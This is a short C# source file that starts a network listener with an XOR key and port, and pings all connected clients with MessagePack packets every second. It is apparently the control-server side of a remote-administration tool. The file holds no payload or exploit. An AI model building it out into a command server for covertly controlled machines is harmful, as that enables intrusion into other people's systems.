using System;
using System.Linq;
using System.Threading;
using Server.MessagePack;

namespace Server
{
    class Program
    {
        public static System.Timers.Timer tim = new System.Timers.Timer(1000);
        static void Main(string[] args)
        {
#if DEBUG
            Settings.XorKey = "qwqdanchun";
            Settings.Port = 8848;
#else
            Settings.XorKey = args[1];
            Settings.Port = Convert.ToInt32(args[0]);
#endif
            Listener listener = new Listener();
            Thread thread = new Thread(new ThreadStart(listener.Connect));
            thread.Start();
            tim.Elapsed += Tim_Elapsed;
            tim.Start();
        }

        private static void Tim_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (Settings.Online.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients CL in Settings.Online.ToList())
                {
                    ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                }
            }
        }
    }
}
